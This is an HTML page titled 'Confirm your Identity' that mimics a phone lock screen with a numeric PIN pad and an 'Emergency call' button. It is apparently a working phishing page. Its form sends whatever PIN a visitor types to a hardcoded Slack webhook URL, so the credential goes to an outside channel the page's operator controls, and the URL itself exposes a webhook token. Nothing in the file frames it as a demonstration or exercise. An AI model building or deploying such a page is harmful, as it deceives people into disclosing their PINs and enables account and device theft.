
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm your Identity</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://i.pinimg.com/236x/a2/b3/ce/a2b3ceea1db6480108f04be1d5ef6f61.jpg') no-repeat center center/cover;
            font-family: Arial, sans-serif;
            color: white;
            margin: 0;
            overflow: hidden;
        }
        .lock-screen {
            text-align: center;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        p {
            font-size: 14px;
            margin-top: 0;
        }
        .pin-display {
            font-size: 32px;
            letter-spacing: 10px;
            background: transparent;
            border: none;
            color: white;
            text-align: center;
            width: 120px;
        }
        .num-pad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 20px;
        }
        .num-pad button {
            width: 70px;
            height: 70px;
            font-size: 24px;
            border-radius: 50%;
            border: none;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            cursor: pointer;
        }
        .bottom-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
        }
        .bottom-buttons button {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            font-size: 18px;
            padding: 10px 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="lock-screen">
        <h2>Enter PIN</h2>
        <p>Your PIN contains at least 4 digits.</p>
        <form id="pinForm" action="https://hooks.slack.com/services/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" method="POST">
            <input type="password" id="pin" name="pin" class="pin-display" maxlength="4" readonly>
            <div class="num-pad">
                <button type="button" onclick="enterDigit(1)">1</button>
                <button type="button" onclick="enterDigit(2)">2</button>
                <button type="button" onclick="enterDigit(3)">3</button>
                <button type="button" onclick="enterDigit(4)">4</button>
                <button type="button" onclick="enterDigit(5)">5</button>
                <button type="button" onclick="enterDigit(6)">6</button>
                <button type="button" onclick="enterDigit(7)">7</button>
                <button type="button" onclick="enterDigit(8)">8</button>
                <button type="button" onclick="enterDigit(9)">9</button>
                <button type="button" onclick="clearPin()">&#x232B;</button>
                <button type="button" onclick="enterDigit(0)">0</button>
                <button type="submit" value="Submit">OK</button>
            </div>
        </form>
        <div class="bottom-buttons">
            <button onclick="alert('Emergency call')">Emergency call</button>
        </div>
    </div>
    <script>
        
        function enterDigit(digit) {
            let pinInput = document.getElementById('pin');
            if (pinInput.value.length < 4) {
                pinInput.value += digit;
            }
        }
        function clearPin() {
            document.getElementById('pin').value = '';
        }
        
    </script>
</body>
</html>
